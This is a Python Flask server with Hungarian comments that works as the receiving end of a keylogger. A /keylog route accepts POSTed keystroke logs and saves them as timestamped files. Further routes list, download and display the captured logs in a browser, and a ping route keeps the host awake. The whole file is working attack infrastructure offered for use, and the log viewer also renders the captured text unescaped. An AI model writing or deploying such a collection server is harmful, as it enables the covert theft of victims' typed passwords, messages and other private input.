from flask import Flask, request, send_file, abort
from datetime import datetime
import os
import glob

app = Flask(__name__)

# --- NAPLÓ FOGADÁSA ---
@app.route('/keylog', methods=['POST'])
def receive_logs():
    data = request.form.get('logs', '')
    if data:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"log_{timestamp}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"IDŐ: {datetime.now().isoformat()}\n")
            f.write("-" * 50 + "\n")
            f.write(data)
        print(f"[+] Napló mentve: {filename}")
        return "OK", 200
    return "HIBA", 400

# --- PING (ÉBREN TARTÁS) ---
@app.route('/ping', methods=['GET'])
def ping():
    return "Élek!", 200

# --- NAPLÓK LISTÁZÁSA ---
@app.route('/logs', methods=['GET'])
def list_logs():
    files = glob.glob("log_*.txt")
    if not files:
        return "Nincs egy naplófájl sem."
    
    html = "<h2>Naplófájlok listája</h2><ul>"
    for f in sorted(files, reverse=True):
        html += f'<li><a href="/download/{f}">{f}</a></li>'
    html += "</ul>"
    return html

# --- NAPLÓ LETÖLTÉSE ---
@app.route('/download/<filename>', methods=['GET'])
def download_log(filename):
    if not filename.startswith("log_") or not filename.endswith(".txt"):
        abort(404)
    
    filepath = os.path.join(os.getcwd(), filename)
    if not os.path.exists(filepath):
        abort(404)
    
    return send_file(filepath, as_attachment=True)

# --- NAPLÓ MEGTEKINTÉSE (BÖNGÉSZŐBEN) ---
@app.route('/view/<filename>', methods=['GET'])
def view_log(filename):
    if not filename.startswith("log_") or not filename.endswith(".txt"):
        abort(404)
    
    filepath = os.path.join(os.getcwd(), filename)
    if not os.path.exists(filepath):
        abort(404)
    
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    
    return f"<pre>{content}</pre>"

# --- INDÍTÁS ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
